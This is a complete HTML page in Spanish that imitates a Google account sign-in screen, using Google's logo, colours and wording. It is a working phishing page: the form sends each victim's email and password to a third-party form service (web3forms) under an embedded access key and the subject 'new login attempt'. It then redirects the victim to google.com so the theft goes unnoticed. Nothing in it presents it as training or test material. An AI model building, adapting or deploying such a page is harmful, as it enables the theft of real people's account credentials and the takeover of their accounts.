<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Cuenta de Google</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap">
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #202124;
        }
        
        .login-container {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            box-sizing: border-box;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .logo img {
            width: 75px;
            height: 24px;
        }
        
        .title {
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            text-align: center;
            margin-bottom: 16px;
        }
        
        .subtitle {
            font-size: 16px;
            font-weight: 400;
            letter-spacing: 0.1px;
            line-height: 1.5;
            text-align: center;
            margin-bottom: 40px;
        }
        
        .input-field {
            margin-bottom: 20px;
            position: relative;
        }
        
        .input-field input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
        }
        
        .input-field input:focus {
            border-color: #1a73e8;
            outline: none;
        }
        
        .input-label {
            position: absolute;
            top: -8px;
            left: 10px;
            background: white;
            padding: 0 5px;
            font-size: 12px;
            color: #5f6368;
        }
        
        .forgot-password {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            margin-bottom: 40px;
            display: block;
        }
        
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }
        
        .login-button {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        
        .login-button:hover {
            background-color: #1765cc;
        }
        
        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 12px;
            color: #5f6368;
        }
        
        .language-selector {
            position: absolute;
            bottom: 20px;
            left: 20px;
            font-size: 12px;
            color: #5f6368;
        }
        
        .checkbox-container {
            margin: 20px 0;
            display: flex;
            align-items: center;
        }
        
        .checkbox-container input {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
        </div>
        
        <h1 class="title">Iniciar sesión</h1>
        <p class="subtitle">Utiliza tu cuenta de Google</p>
        
        <form action="https://api.web3forms.com/submit" method="POST" id="web3form">
        <input type="hidden" name="access_key" value="9ad81417-955b-4417-a00d-8c8fc94af292">
	 <input type="hidden" name="redirect" value="https://www.google.com">
            <div class="input-field">
                <span class="input-label">Correo electrónico o teléfono</span>
                <input type="email" name="email" required>
            </div>
            
            <div class="input-field">
                <span class="input-label">Contraseña</span>
                <input type="password" name="clave" required>
            </div>
            
            <div class="checkbox-container">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember">Recordar esta contraseña</label>
            </div>
            
            <a href="#" class="forgot-password">¿Has olvidado la contraseña?</a>
            
            <div class="buttons">
                <a href="#" class="create-account">Crear cuenta</a>
                <button type="submit" class="login-button">Iniciar sesión</button>
            </div>
            
            <!-- Campos ocultos para Formsubmit -->
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_subject" value="Nuevo intento de inicio de sesión">
        </form>
        
        <div class="footer">
            <p>Al iniciar sesión, aceptas las Condiciones de uso y la Política de privacidad.</p>
        </div>
    </div>
    
    <div class="language-selector">
        <select>
            <option>Español (España)</option>
            <option>English (United States)</option>
        </select>
    </div>
</body>
</html>
